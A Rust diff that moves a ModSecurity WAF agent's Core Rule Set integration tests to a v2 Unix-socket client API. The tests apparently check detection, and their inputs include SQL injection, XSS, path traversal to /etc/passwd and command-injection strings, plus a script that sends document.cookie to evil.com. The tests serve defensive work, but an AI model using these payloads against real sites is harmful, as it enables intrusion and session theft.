@@ -6,8 +6,9 @@
 use base64::Engine;
 use zentinel_agent_modsec::{ModSecAgent, ModSecConfig};
 use zentinel_agent_protocol::{
-    AgentClient, AgentServer, Decision, EventType, RequestBodyChunkEvent, RequestHeadersEvent,
+    Decision, RequestBodyChunkEvent, RequestHeadersEvent,
     RequestMetadata,
+    v2::{AgentClientV2Uds, UdsAgentServerV2},
 };
 use std::collections::HashMap;
 use std::path::Path;
@@ -44,7 +45,7 @@ async fn start_crs_server(config: ModSecConfig) -> Option<(tempfile::TempDir, st
         }
     };
 
-    let server = AgentServer::new("test-modsec-crs", socket_path.clone(), Box::new(agent));
+    let server = UdsAgentServerV2::new("test-modsec-crs", socket_path.clone(), Box::new(agent));
 
     tokio::spawn(async move {
         let _ = server.run().await;
@@ -57,8 +58,11 @@ async fn start_crs_server(config: ModSecConfig) -> Option<(tempfile::TempDir, st
 }
 
 /// Create a client connected to the test server
-async fn create_client(socket_path: &std::path::Path) -> AgentClient {
-    AgentClient::unix_socket("test-client", socket_path, Duration::from_secs(5))
+async fn create_client(socket_path: &std::path::Path) -> AgentClientV2Uds {
+    AgentClientV2Uds::new("test-client", socket_path.to_string_lossy().to_string(), Duration::from_secs(5))
+        .await
+        .expect("Failed to create agent client")
+        .connect()
         .await
         .expect("Failed to connect to agent")
 }
@@ -143,7 +147,7 @@ async fn test_crs_sqli_union_select() {
         HashMap::new(),
     );
     let response = client
-        .send_event(EventType::RequestHeaders, &event)
+        .send_request_headers(&event.metadata.correlation_id, &event)
         .await
         .expect("Failed to send event");
 
@@ -171,7 +175,7 @@ async fn test_crs_sqli_boolean_based() {
     // Boolean-based blind SQL injection
     let event = make_request_headers("GET", "/user?id=1' AND '1'='1", HashMap::new());
     let response = client
-        .send_event(EventType::RequestHeaders, &event)
+        .send_request_headers(&event.metadata.correlation_id, &event)
         .await
         .expect("Failed to send event");
 
@@ -199,7 +203,7 @@ async fn test_crs_sqli_time_based() {
     // Time-based blind SQL injection
     let event = make_request_headers("GET", "/api?id=1; WAITFOR DELAY '0:0:5'--", HashMap::new());
     let response = client
-        .send_event(EventType::RequestHeaders, &event)
+        .send_request_headers(&event.metadata.correlation_id, &event)
         .await
         .expect("Failed to send event");
 
@@ -234,7 +238,7 @@ async fn test_crs_xss_script_tag() {
         HashMap::new(),
     );
     let response = client
-        .send_event(EventType::RequestHeaders, &event)
+        .send_request_headers(&event.metadata.correlation_id, &event)
         .await
         .expect("Failed to send event");
 
@@ -265,7 +269,7 @@ async fn test_crs_xss_event_handler() {
         HashMap::new(),
     );
     let response = client
-        .send_event(EventType::RequestHeaders, &event)
+        .send_request_headers(&event.metadata.correlation_id, &event)
         .await
         .expect("Failed to send event");
 
@@ -292,7 +296,7 @@ async fn test_crs_xss_svg_onload() {
 
     let event = make_request_headers("GET", "/page?data=<svg onload=alert(1)>", HashMap::new());
     let response = client
-        .send_event(EventType::RequestHeaders, &event)
+        .send_request_headers(&event.metadata.correlation_id, &event)
         .await
         .expect("Failed to send event");
 
@@ -323,7 +327,7 @@ async fn test_crs_path_traversal_etc_passwd() {
 
     let event = make_request_headers("GET", "/download?file=../../../etc/passwd", HashMap::new());
     let response = client
-        .send_event(EventType::RequestHeaders, &event)
+        .send_request_headers(&event.metadata.correlation_id, &event)
         .await
         .expect("Failed to send event");
 
@@ -354,7 +358,7 @@ async fn test_crs_path_traversal_windows() {
         HashMap::new(),
     );
     let response = client
-        .send_event(EventType::RequestHeaders, &event)
+        .send_request_headers(&event.metadata.correlation_id, &event)
         .await
         .expect("Failed to send event");
 
@@ -392,7 +396,7 @@ async fn test_crs_command_injection_semicolon() {
         HashMap::new(),
     );
     let response = client
-        .send_event(EventType::RequestHeaders, &event)
+        .send_request_headers(&event.metadata.correlation_id, &event)
         .await
         .expect("Failed to send event");
 
@@ -422,7 +426,7 @@ async fn test_crs_command_injection_backticks() {
 
     let event = make_request_headers("GET", "/run?cmd=`id`", HashMap::new());
     let response = client
-        .send_event(EventType::RequestHeaders, &event)
+        .send_request_headers(&event.metadata.correlation_id, &event)
         .await
         .expect("Failed to send event");
 
@@ -452,7 +456,7 @@ async fn test_crs_command_injection_pipe() {
 
     let event = make_request_headers("GET", "/exec?input=test | whoami", HashMap::new());
     let response = client
-        .send_event(EventType::RequestHeaders, &event)
+        .send_request_headers(&event.metadata.correlation_id, &event)
         .await
         .expect("Failed to send event");
 
@@ -492,7 +496,7 @@ async fn test_crs_scanner_sqlmap() {
 
     let event = make_request_headers("GET", "/api/users", headers);
     let response = client
-        .send_event(EventType::RequestHeaders, &event)
+        .send_request_headers(&event.metadata.correlation_id, &event)
         .await
         .expect("Failed to send event");
 
@@ -525,7 +529,7 @@ async fn test_crs_scanner_nikto() {
 
     let event = make_request_headers("GET", "/", headers);
     let response = client
-        .send_event(EventType::RequestHeaders, &event)
+        .send_request_headers(&event.metadata.correlation_id, &event)
         .await
         .expect("Failed to send event");
 
@@ -562,7 +566,7 @@ async fn test_crs_http_request_smuggling() {
 
     let event = make_request_headers("POST", "/api", headers);
     let response = client
-        .send_event(EventType::RequestHeaders, &event)
+        .send_request_headers(&event.metadata.correlation_id, &event)
         .await
         .expect("Failed to send event");
 
@@ -597,14 +601,14 @@ async fn test_crs_sqli_in_json_body() {
 
     let headers_event = make_request_headers("POST", "/api/login", headers);
     let _ = client
-        .send_event(EventType::RequestHeaders, &headers_event)
+        .send_request_headers(&headers_event.metadata.correlation_id, &headers_event)
         .await
         .expect("Failed to send headers");
 
     let body = r#"{"username": "admin' OR '1'='1", "password": "test"}"#;
     let body_event = make_body_chunk(&headers_event.metadata.correlation_id, body, true);
     let response = client
-        .send_event(EventType::RequestBodyChunk, &body_event)
+        .send_request_body_chunk(&body_event.correlation_id, &body_event)
         .await
         .expect("Failed to send body");
 
@@ -638,14 +642,14 @@ async fn test_crs_xss_in_form_body() {
 
     let headers_event = make_request_headers("POST", "/comment", headers);
     let _ = client
-        .send_event(EventType::RequestHeaders, &headers_event)
+        .send_request_headers(&headers_event.metadata.correlation_id, &headers_event)
         .await
         .expect("Failed to send headers");
 
     let body = "comment=<script>document.location='http://evil.com/?c='+document.cookie</script>";
     let body_event = make_body_chunk(&headers_event.metadata.correlation_id, body, true);
     let response = client
-        .send_event(EventType::RequestBodyChunk, &body_event)
+        .send_request_body_chunk(&body_event.correlation_id, &body_event)
         .await
         .expect("Failed to send body");
 
@@ -683,7 +687,7 @@ async fn test_crs_clean_get_request() {
 
     let event = make_request_headers("GET", "/api/users?page=1&limit=20", headers);
     let response = client
-        .send_event(EventType::RequestHeaders, &event)
+        .send_request_headers(&event.metadata.correlation_id, &event)
         .await
         .expect("Failed to send event");
 
@@ -718,14 +722,14 @@ async fn test_crs_clean_post_request() {
 
     let headers_event = make_request_headers("POST", "/api/users", headers);
     let _ = client
-        .send_event(EventType::RequestHeaders, &headers_event)
+        .send_request_headers(&headers_event.metadata.correlation_id, &headers_event)
         .await
         .expect("Failed to send headers");
 
     let body = r#"{"name": "John Doe", "email": "john@example.com", "age": 30}"#;
     let body_event = make_body_chunk(&headers_event.metadata.correlation_id, body, true);
     let response = client
-        .send_event(EventType::RequestBodyChunk, &body_event)
+        .send_request_body_chunk(&body_event.correlation_id, &body_event)
         .await
         .expect("Failed to send body");
 
@@ -762,7 +766,7 @@ async fn test_crs_detect_only_mode() {
         HashMap::new(),
     );
     let response = client
-        .send_event(EventType::RequestHeaders, &event)
+        .send_request_headers(&event.metadata.correlation_id, &event)
         .await
         .expect("Failed to send event");
 
